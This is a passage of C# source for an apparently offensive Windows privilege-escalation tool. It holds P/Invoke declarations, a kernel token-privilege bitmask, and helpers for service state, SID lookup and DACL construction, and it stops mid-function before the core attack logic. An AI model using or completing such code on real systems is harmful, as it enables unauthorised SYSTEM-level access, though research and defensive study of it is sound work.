using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace TakeOwnershipServiceModificationVariant
{
    internal class TakeOwnershipServiceModificationVariant
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F
        }

        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        enum REG_TYPE
        {
            REG_NONE = 0,
            REG_SZ = 1,
            REG_EXPAND_SZ = 2,
            REG_BINARY = 3,
            REG_DWORD = 4,
            REG_DWORD_LITTLE_ENDIAN = 4,
            REG_DWORD_BIG_ENDIAN = 5,
            REG_LINK = 6,
            REG_MULTI_SZ = 7,
            REG_RESOURCE_LIST = 8,
            REG_FULL_RESOURCE_DESCRIPTOR = 9,
            REG_RESOURCE_REQUIREMENTS_LIST = 10,
            REG_QWORD = 11,
            REG_QWORD_LITTLE_ENDIAN = 11
        }

        enum SE_OBJECT_TYPE
        {
            SE_UNKNOWN_OBJECT_TYPE,
            SE_FILE_OBJECT,
            SE_SERVICE,
            SE_PRINTER,
            SE_REGISTRY_KEY,
            SE_LMSHARE,
            SE_KERNEL_OBJECT,
            SE_WINDOW_OBJECT,
            SE_DS_OBJECT,
            SE_DS_OBJECT_ALL,
            SE_PROVIDER_DEFINED_OBJECT,
            SE_WMIGUID_OBJECT,
            SE_REGISTRY_WOW64_32KEY,
            SE_REGISTRY_WOW64_64KEY
        }

        [Flags]
        enum SECURITY_INFORMATION : uint
        {
            OWNER_SECURITY_INFORMATION = 0x00000001,
            GROUP_SECURITY_INFORMATION = 0x00000002,
            DACL_SECURITY_INFORMATION = 0x00000004,
            SACL_SECURITY_INFORMATION = 0x00000008,
            UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
            UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
            PROTECTED_SACL_SECURITY_INFORMATION = 0x40000000,
            PROTECTED_DACL_SECURITY_INFORMATION = 0x80000000
        }

        enum SERVICE_STATE
        {
            SERVICE_STOPPED = 1,
            SERVICE_START_PENDING,
            SERVICE_STOP_PENDING,
            SERVICE_RUNNING,
            SERVICE_CONTINUE_PENDING,
            SERVICE_PAUSE_PENDING,
            SERVICE_PAUSED
        }

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer,
            SidTypeLabel,
            SidTypeLogonSession
        }

        enum SYSTEM_INFORMATION_CLASS
        {
            SystemBasicInformation = 0x00,
            SystemProcessorInformation = 0x01,
            SystemPerformanceInformation = 0x02,
            SystemTimeOfDayInformation = 0x03,
            SystemPathInformation = 0x04,
            SystemProcessInformation = 0x05,
            SystemCallCountInformation = 0x06,
            SystemDeviceInformation = 0x07,
            SystemProcessorPerformanceInformation = 0x08,
            SystemFlagsInformation = 0x09,
            SystemCallTimeInformation = 0x0A,
            SystemModuleInformation = 0x0B,
            SystemLocksInformation = 0x0C,
            SystemStackTraceInformation = 0x0D,
            SystemPagedPoolInformation = 0x0E,
            SystemNonPagedPoolInformation = 0x0F,
            SystemHandleInformation = 0x10,
            SystemObjectInformation = 0x11,
            SystemPageFileInformation = 0x12,
            SystemVdmInstemulInformation = 0x13,
            SystemVdmBopInformation = 0x14,
            SystemFileCacheInformation = 0x15,
            SystemPoolTagInformation = 0x16,
            SystemInterruptInformation = 0x17,
            SystemDpcBehaviorInformation = 0x18,
            SystemFullMemoryInformation = 0x19,
            SystemLoadGdiDriverInformation = 0x1A,
            SystemUnloadGdiDriverInformation = 0x1B,
            SystemTimeAdjustmentInformation = 0x1C,
            SystemSummaryMemoryInformation = 0x1D,
            SystemMirrorMemoryInformation = 0x1E,
            SystemPerformanceTraceInformation = 0x1F,
            SystemObsolete0 = 0x20,
            SystemExceptionInformation = 0x21,
            SystemCrashDumpStateInformation = 0x22,
            SystemKernelDebuggerInformation = 0x23,
            SystemContextSwitchInformation = 0x24,
            SystemRegistryQuotaInformation = 0x25,
            SystemExtendServiceTableInformation = 0x26,
            SystemPrioritySeperation = 0x27,
            SystemVerifierAddDriverInformation = 0x28,
            SystemVerifierRemoveDriverInformation = 0x29,
            SystemProcessorIdleInformation = 0x2A,
            SystemLegacyDriverInformation = 0x2B,
            SystemCurrentTimeZoneInformation = 0x2C,
            SystemLookasideInformation = 0x2D,
            SystemTimeSlipNotification = 0x2E,
            SystemSessionCreate = 0x2F,
            SystemSessionDetach = 0x30,
            SystemSessionInformation = 0x31,
            SystemRangeStartInformation = 0x32,
            SystemVerifierInformation = 0x33,
            SystemVerifierThunkExtend = 0x34,
            SystemSessionProcessInformation = 0x35,
            SystemLoadGdiDriverInSystemSpace = 0x36,
            SystemNumaProcessorMap = 0x37,
            SystemPrefetcherInformation = 0x38,
            SystemExtendedProcessInformation = 0x39,
            SystemRecommendedSharedDataAlignment = 0x3A,
            SystemComPlusPackage = 0x3B,
            SystemNumaAvailableMemory = 0x3C,
            SystemProcessorPowerInformation = 0x3D,
            SystemEmulationBasicInformation = 0x3E,
            SystemEmulationProcessorInformation = 0x3F,
            SystemExtendedHandleInformation = 0x40,
            SystemLostDelayedWriteInformation = 0x41,
            SystemBigPoolInformation = 0x42,
            SystemSessionPoolTagInformation = 0x43,
            SystemSessionMappedViewInformation = 0x44,
            SystemHotpatchInformation = 0x45,
            SystemObjectSecurityMode = 0x46,
            SystemWatchdogTimerHandler = 0x47,
            SystemWatchdogTimerInformation = 0x48,
            SystemLogicalProcessorInformation = 0x49,
            SystemWow64SharedInformationObsolete = 0x4A,
            SystemRegisterFirmwareTableInformationHandler = 0x4B,
            SystemFirmwareTableInformation = 0x4C,
            SystemModuleInformationEx = 0x4D,
            SystemVerifierTriageInformation = 0x4E,
            SystemSuperfetchInformation = 0x4F,
            SystemMemoryListInformation = 0x50,
            SystemFileCacheInformationEx = 0x51,
            SystemThreadPriorityClientIdInformation = 0x52,
            SystemProcessorIdleCycleTimeInformation = 0x53,
            SystemVerifierCancellationInformation = 0x54,
            SystemProcessorPowerInformationEx = 0x55,
            SystemRefTraceInformation = 0x56,
            SystemSpecialPoolInformation = 0x57,
            SystemProcessIdInformation = 0x58,
            SystemErrorPortInformation = 0x59,
            SystemBootEnvironmentInformation = 0x5A,
            SystemHypervisorInformation = 0x5B,
            SystemVerifierInformationEx = 0x5C,
            SystemTimeZoneInformation = 0x5D,
            SystemImageFileExecutionOptionsInformation = 0x5E,
            SystemCoverageInformation = 0x5F,
            SystemPrefetchPatchInformation = 0x60,
            SystemVerifierFaultsInformation = 0x61,
            SystemSystemPartitionInformation = 0x62,
            SystemSystemDiskInformation = 0x63,
            SystemProcessorPerformanceDistribution = 0x64,
            SystemNumaProximityNodeInformation = 0x65,
            SystemDynamicTimeZoneInformation = 0x66,
            SystemCodeIntegrityInformation = 0x67,
            SystemProcessorMicrocodeUpdateInformation = 0x68,
            SystemProcessorBrandString = 0x69,
            SystemVirtualAddressInformation = 0x6A,
            SystemLogicalProcessorAndGroupInformation = 0x6B,
            SystemProcessorCycleTimeInformation = 0x6C,
            SystemStoreInformation = 0x6D,
            SystemRegistryAppendString = 0x6E,
            SystemAitSamplingValue = 0x6F,
            SystemVhdBootInformation = 0x70,
            SystemCpuQuotaInformation = 0x71,
            SystemNativeBasicInformation = 0x72,
            SystemErrorPortTimeouts = 0x73,
            SystemLowPriorityIoInformation = 0x74,
            SystemBootEntropyInformation = 0x75,
            SystemVerifierCountersInformation = 0x76,
            SystemPagedPoolInformationEx = 0x77,
            SystemSystemPtesInformationEx = 0x78,
            SystemNodeDistanceInformation = 0x79,
            SystemAcpiAuditInformation = 0x7A,
            SystemBasicPerformanceInformation = 0x7B,
            SystemQueryPerformanceCounterInformation = 0x7C,
            SystemSessionBigPoolInformation = 0x7D,
            SystemBootGraphicsInformation = 0x7E,
            SystemScrubPhysicalMemoryInformation = 0x7F,
            SystemBadPageInformation = 0x80,
            SystemProcessorProfileControlArea = 0x81,
            SystemCombinePhysicalMemoryInformation = 0x82,
            SystemEntropyInterruptTimingInformation = 0x83,
            SystemConsoleInformation = 0x84,
            SystemPlatformBinaryInformation = 0x85,
            SystemPolicyInformation = 0x86,
            SystemHypervisorProcessorCountInformation = 0x87,
            SystemDeviceDataInformation = 0x88,
            SystemDeviceDataEnumerationInformation = 0x89,
            SystemMemoryTopologyInformation = 0x8A,
            SystemMemoryChannelInformation = 0x8B,
            SystemBootLogoInformation = 0x8C,
            SystemProcessorPerformanceInformationEx = 0x8D,
            SystemCriticalProcessErrorLogInformation = 0x8E,
            SystemSecureBootPolicyInformation = 0x8F,
            SystemPageFileInformationEx = 0x90,
            SystemSecureBootInformation = 0x91,
            SystemEntropyInterruptTimingRawInformation = 0x92,
            SystemPortableWorkspaceEfiLauncherInformation = 0x93,
            SystemFullProcessInformation = 0x94,
            SystemKernelDebuggerInformationEx = 0x95,
            SystemBootMetadataInformation = 0x96,
            SystemSoftRebootInformation = 0x97,
            SystemElamCertificateInformation = 0x98,
            SystemOfflineDumpConfigInformation = 0x99,
            SystemProcessorFeaturesInformation = 0x9A,
            SystemRegistryReconciliationInformation = 0x9B,
            SystemEdidInformation = 0x9C,
            SystemManufacturingInformation = 0x9D,
            SystemEnergyEstimationConfigInformation = 0x9E,
            SystemHypervisorDetailInformation = 0x9F,
            SystemProcessorCycleStatsInformation = 0xA0,
            SystemVmGenerationCountInformation = 0xA1,
            SystemTrustedPlatformModuleInformation = 0xA2,
            SystemKernelDebuggerFlags = 0xA3,
            SystemCodeIntegrityPolicyInformation = 0xA4,
            SystemIsolatedUserModeInformation = 0xA5,
            SystemHardwareSecurityTestInterfaceResultsInformation = 0xA6,
            SystemSingleModuleInformation = 0xA7,
            SystemAllowedCpuSetsInformation = 0xA8,
            SystemDmaProtectionInformation = 0xA9,
            SystemInterruptCpuSetsInformation = 0xAA,
            SystemSecureBootPolicyFullInformation = 0xAB,
            SystemCodeIntegrityPolicyFullInformation = 0xAC,
            SystemAffinitizedInterruptProcessorInformation = 0xAD,
            SystemRootSiloInformation = 0xAE,
            SystemCpuSetInformation = 0xAF,
            SystemCpuSetTagInformation = 0xB0,
            SystemWin32WerStartCallout = 0xB1,
            SystemSecureKernelProfileInformation = 0xB2,
            SystemCodeIntegrityPlatformManifestInformation = 0xB3,
            SystemInterruptSteeringInformation = 0xB4,
            SystemSuppportedProcessorArchitectures = 0xB5,
            SystemMemoryUsageInformation = 0xB6,
            SystemCodeIntegrityCertificateInformation = 0xB7,
            SystemPhysicalMemoryInformation = 0xB8,
            SystemControlFlowTransition = 0xB9,
            SystemKernelDebuggingAllowed = 0xBA,
            SystemActivityModerationExeState = 0xBB,
            SystemActivityModerationUserSettings = 0xBC,
            SystemCodeIntegrityPoliciesFullInformation = 0xBD,
            SystemCodeIntegrityUnlockInformation = 0xBE,
            SystemIntegrityQuotaInformation = 0xBF,
            SystemFlushInformation = 0xC0,
            SystemProcessorIdleMaskInformation = 0xC1,
            SystemSecureDumpEncryptionInformation = 0xC2,
            SystemWriteConstraintInformation = 0xC3,
            SystemKernelVaShadowInformation = 0xC4,
            SystemHypervisorSharedPageInformation = 0xC5,
            SystemFirmwareBootPerformanceInformation = 0xC6,
            SystemCodeIntegrityVerificationInformation = 0xC7,
            SystemFirmwarePartitionInformation = 0xC8,
            SystemSpeculationControlInformation = 0xC9,
            SystemDmaGuardPolicyInformation = 0xCA,
            SystemEnclaveLaunchControlInformation = 0xCB,
            SystemWorkloadAllowedCpuSetsInformation = 0xCC,
            SystemCodeIntegrityUnlockModeInformation = 0xCD,
            SystemLeapSecondInformation = 0xCE,
            SystemFlags2Information = 0xCF,
            SystemSecurityModelInformation = 0xD0,
            SystemCodeIntegritySyntheticCacheInformation = 0xD1,
            MaxSystemInfoClass = 0xD2
        }

        [Flags]
        enum TokenAccessFlags : uint
        {
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_EXECUTE = 0x00020000,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_READ = 0x00020008,
            TOKEN_WRITE = 0x000200E0,
            TOKEN_ALL_ACCESS = 0x000F01FF,
            MAXIMUM_ALLOWED = 0x02000000
        }

        /*
         * P/Invoke : Structs
         */
        [StructLayout(LayoutKind.Sequential)]
        struct ACCESS_ALLOWED_ACE
        {
            public ACE_HEADER Header;
            public int Mask;
            public int SidStart;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct ACE_HEADER
        {
            public byte AceType;
            public byte AceFlags;
            public short AceSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct ACL
        {
            public byte AclRevision;
            public byte Sbz1;
            public short AclSize;
            public short AceCount;
            public short Sbz2;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct SERVICE_STATUS_PROCESS
        {
            public int dwServiceType;
            public int dwCurrentState;
            public int dwControlsAccepted;
            public int dwWin32ExitCode;
            public int dwServiceSpecificExitCode;
            public int dwCheckPoint;
            public int dwWaitHint;
            public int dwProcessId;
            public int dwServiceFlags;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public int GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public int HandleAttributes;
            public int Reserved;
        }


        /*
         * P/Invoke : Win32 APIs
         */
        /*
         * advapi32.dll
         */
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AddAccessAllowedAce(
            IntPtr pAcl,
            int dwAceRevision,
            ACCESS_MASK AccessMask,
            IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool CloseServiceHandle(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool ConvertSidToStringSid(
            IntPtr /* PSID */ Sid,
            out string StringSid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetNamedSecurityInfo(
            string pObjectName,
            SE_OBJECT_TYPE ObjectType,
            SECURITY_INFORMATION SecurityInfo,
            out IntPtr /* PSID* */ ppsidOwner,
            out IntPtr /* PSID* */ ppsidGroup,
            out IntPtr /* PACL* */ ppDacl,
            out IntPtr /* PACL* */ ppSacl,
            out IntPtr /* PSECURITY_DESCRIPTOR* */ ppSecurityDescriptor);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetNamedSecurityInfo(
            string pObjectName,
            SE_OBJECT_TYPE ObjectType,
            SECURITY_INFORMATION SecurityInfo,
            out IntPtr /* PSID* */ ppsidOwner,
            IntPtr ppsidGroup,
            IntPtr ppDacl,
            IntPtr ppSacl,
            IntPtr ppSecurityDescriptor);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool InitializeAcl(
            IntPtr pAcl,
            int nAclLength,
            int dwAclRevision);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool IsValidSid(IntPtr /* PSID */ pSid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool LookupAccountName(
            string lpSystemName,
            string lpAccountName,
            IntPtr /* PSID */ Sid,
            ref int cbSid,
            StringBuilder ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool LookupAccountSid(
            string lpSystemName,
            IntPtr /* PSID */ Sid,
            StringBuilder Name,
            ref int cchName,
            StringBuilder ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(
            IntPtr hProcess,
            TokenAccessFlags DesiredAccess,
            out IntPtr hToken);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool QueryServiceStatusEx(
            IntPtr serviceHandle,
            int infoLevel,
            IntPtr buffer,
            int bufferSize,
            out int bytesNeeded);

        [DllImport("advapi32.dll", SetLastError = false)]
        static extern int RegCreateKeyEx(
            UIntPtr hKey,
            string lpSubKey,
            IntPtr Reserved,
            IntPtr lpClass,
            uint dwOptions,
            uint samDesired,
            IntPtr lpSecurityAttributes,
            out IntPtr phkResult,
            IntPtr lpdwDisposition);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int RegQueryValueEx(
            IntPtr hKey,
            string lpValueName,
            int lpReserved,
            out REG_TYPE lpType,
            IntPtr lpData,
            ref int lpcbData);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int RegSetValueEx(
            IntPtr hKey,
            string lpValueName,
            int Reserved,
            REG_TYPE dwType,
            IntPtr lpData,
            int cbData);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int SetNamedSecurityInfo(
            string pObjectName,
            SE_OBJECT_TYPE ObjectType,
            SECURITY_INFORMATION SecurityInfo,
            IntPtr /* PSID */ psidOwner,
            IntPtr /* PSID */ psidGroup,
            IntPtr /* PACL */ pDacl,
            IntPtr /* PACL */ pSacl);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            IntPtr lpServiceArgVectors);

        /*
         * kernel32.dll
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            FileAccess dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            FileAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        /*
         * ntdll.dll
         */
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            ref int ReturnLength);

        /*
         * Windows Consts
         */
        const int STATUS_SUCCESS = 0;
        static readonly int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const int ERROR_SUCCESS = 0;
        const int ERROR_INSUFFICIENT_BUFFER = 122;
        const int ERROR_MORE_DATA = 234;
        const int ERROR_SERVICE_REQUEST_TIMEOUT = 1053;
        static readonly UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        const uint REG_OPTION_NON_VOLATILE = 0x00000000;
        const uint KEY_SET_VALUE = 0x0002;
        const uint KEY_QUERY_VALUE = 0x0001;
        const uint SERVICE_QUERY_STATUS = 0x00004;
        const uint SERVICE_START = 0x10;
        const uint SC_MANAGER_CONNECT = 0x0001;
        const int SC_STATUS_PROCESS_INFO = 0;
        const int ACL_REVISION = 2;
        const int SECURITY_MAX_SID_SIZE = 68;


        // User define Consts
        [Flags]
        enum SepTokenPrivilegesFlags : ulong
        {
            CREATE_TOKEN = 0x0000000000000004UL, // SeCreateTokenPrivilege
            ASSIGNPRIMARYTOKEN = 0x0000000000000008UL, // SeAssignPrimaryTokenPrivilege
            LOCK_MEMORY = 0x0000000000000010UL, // SeLockMemoryPrivilege
            INCREASE_QUOTA = 0x0000000000000020UL, // SeIncreaseQuotaPrivilege
            MACHINE_ACCOUNT = 0x0000000000000040UL, // SeMachineAccountPrivilege
            TCB = 0x0000000000000080UL, // SeTcbPrivilege
            SECURITY = 0x0000000000000100UL, // SeSecurityPrivilege
            TAKE_OWNERSHIP = 0x0000000000000200UL, // SeTakeOwnershipPrivilege
            LOAD_DRIVER = 0x0000000000000400UL, // SeLoadDriverPrivilege
            SYSTEM_PROFILE = 0x0000000000000800UL, // SeSystemProfilePrivilege
            SYSTEMTIME = 0x0000000000001000UL, // SeSystemtimePrivilege
            PROFILE_SINGLE_PROCESS = 0x0000000000002000UL, // SeProfileSingleProcessPrivilege
            INCREASE_BASE_PRIORITY = 0x0000000000004000UL, // SeIncreaseBasePriorityPrivilege
            CREATE_PAGEFILE = 0x0000000000008000UL, // SeCreatePagefilePrivilege
            CREATE_PERMANENT = 0x0000000000010000UL, // SeCreatePermanentPrivilege
            BACKUP = 0x0000000000020000UL, // SeBackupPrivilege
            RESTORE = 0x0000000000040000UL, // SeRestorePrivilege
            SHUTDOWN = 0x0000000000080000UL, // SeShutdownPrivilege
            DEBUG = 0x0000000000100000UL, // SeDebugPrivilege
            AUDIT = 0x0000000000200000UL, // SeAuditPrivilege
            SYSTEM_ENVIRONMENT = 0x0000000000400000UL, // SeSystemEnvironmentPrivilege
            CHANGE_NOTIFY = 0x0000000000800000UL, // SeChangeNotifyPrivilege
            REMOTE_SHUTDOWN = 0x0000000001000000UL, // SeRemoteShutdownPrivilege
            UNDOCK = 0x0000000002000000UL, // SeUndockPrivilege
            SYNC_AGENT = 0x0000000004000000UL, // SeSyncAgentPrivilege
            ENABLE_DELEGATION = 0x0000000008000000UL, // SeEnableDelegationPrivilege
            MANAGE_VOLUME = 0x0000000010000000UL, // SeManageVolumePrivilege
            IMPERSONATE = 0x0000000020000000UL, // SeImpersonatePrivilege
            CREATE_GLOBAL = 0x0000000040000000UL, // SeCreateGlobalPrivilege
            TRUSTED_CREDMAN_ACCESS = 0x0000000080000000UL, // SeTrustedCredManAccessPrivilege
            RELABEL = 0x0000000100000000UL, // SeRelabelPrivilege
            INCREASE_WORKING_SET = 0x0000000200000000UL, // SeIncreaseWorkingSetPrivilege
            TIME_ZONE = 0x0000000400000000UL, // SeTimeZonePrivilege
            CREATE_SYMBOLIC_LINK = 0x0000000800000000UL, // SeCreateSymbolicLinkPrivilege
            DELEGATE_SESSION_USER_IMPERSONATE = 0x0000001000000000UL, // SeDelegateSessionUserImpersonatePrivilege
            ALL = 0x0000001FFFFFFFFCUL
        }

        // User define functions
        static SERVICE_STATE CheckServiceState(string serviceName)
        {
            int error;
            bool status;
            var hSCManager = OpenSCManager(null, null, SC_MANAGER_CONNECT);

            if (hSCManager == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open service manager.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return 0;
            }

            var hService = OpenService(
                hSCManager,
                serviceName,
                SERVICE_QUERY_STATUS);

            if (hService == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open service.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                CloseServiceHandle(hSCManager);

                return 0;
            }

            var bufferSize = Marshal.SizeOf(typeof(SERVICE_STATUS_PROCESS));
            var buffer = Marshal.AllocHGlobal(bufferSize);

            do
            {
                status = QueryServiceStatusEx(
                    hService,
                    SC_STATUS_PROCESS_INFO,
                    buffer,
                    bufferSize,
                    out int bytesNeeded);
                error = Marshal.GetLastWin32Error();

                if (!status)
                {
                    Marshal.FreeHGlobal(buffer);
                    bufferSize = bytesNeeded;
                    buffer = Marshal.AllocHGlobal(bufferSize);
                }
            } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);

            if (!status)
                return 0;

            var ssp = (SERVICE_STATUS_PROCESS)Marshal.PtrToStructure(
                buffer,
                typeof(SERVICE_STATUS_PROCESS));
            Marshal.FreeHGlobal(buffer);

            return (SERVICE_STATE)ssp.dwCurrentState;
        }


        static bool ConvertAccountNameToSid(
            ref string accountName,
            out IntPtr pSid,
            out SID_NAME_USE peUse)
        {
            int error;
            bool status;
            int cbSid = 8;
            int cchReferencedDomainName = 256;
            var domain = new StringBuilder(cchReferencedDomainName);

            do
            {
                pSid = Marshal.AllocHGlobal(cbSid);

                status = LookupAccountName(
                    null,
                    accountName,
                    pSid,
                    ref cbSid,
                    domain,
                    ref cchReferencedDomainName,
                    out peUse);
                error = Marshal.GetLastWin32Error();

                if (!status)
                {
                    domain.Clear();
                    domain = new StringBuilder(cchReferencedDomainName);
                    Marshal.FreeHGlobal(pSid);
                }
            } while (error == ERROR_INSUFFICIENT_BUFFER && !status);

            if (!status)
            {
                pSid = IntPtr.Zero;
                Console.WriteLine("[-] Failed to resolve account name to SID.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            ConvertSidToAccountName(pSid, out accountName, out peUse);

            return true;
        }


        static bool ConvertSidToAccountName(
            IntPtr pSid,
            out string accountName,
            out SID_NAME_USE peUse)
        {
            int error;
            int cchName = 256;
            int cchReferencedDomainName = 256;
            var name = new StringBuilder(cchName);
            var domain = new StringBuilder(cchReferencedDomainName);

            if (!LookupAccountSid(
                null,
                pSid,
                name,
                ref cchName,
                domain,
                ref cchReferencedDomainName,
                out peUse))
            {
                error = Marshal.GetLastWin32Error();
                accountName = null;
                Console.WriteLine("[-] Failed to resolve SID to account name.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }


            if (string.IsNullOrEmpty(name.ToString()) &&
                string.IsNullOrEmpty(domain.ToString()))
            {
                Console.WriteLine("[-] Failed to resolve SID to account name.");
                accountName = null;

                return false;
            }


            if (string.IsNullOrEmpty(name.ToString()))
            {
                accountName = domain.ToString();
            }
            else if (string.IsNullOrEmpty(domain.ToString()))
            {
                accountName = name.ToString();
            }
            else
            {
                accountName = string.Format(@"{0}\{1}", domain.ToString(), name.ToString());
            }

            return true;
        }


        static void DumpOwnerSidInformation(IntPtr pOwnerSid)
        {
            if (!ConvertSidToAccountName(
                    pOwnerSid,
                    out string accountName,
                    out SID_NAME_USE accountType))
            {
                return;
            }

            ConvertSidToStringSid(pOwnerSid, out string accountSidString);

            Console.WriteLine("[*] Current Owner Information:");
            Console.WriteLine("    |-> Name : {0}", accountName);
            Console.WriteLine("    |-> SID  : {0}", accountSidString);
            Console.WriteLine("    |-> Type : {0}", accountType);
        }


        static IntPtr GetGenericWriteDacl(IntPtr pSid)
        {
            bool status;
            int cbSid = SECURITY_MAX_SID_SIZE;
            int cbDacl;
            IntPtr pDacl;

            if (!IsValidSid(pSid))
                return IntPtr.Zero;

            do
            {
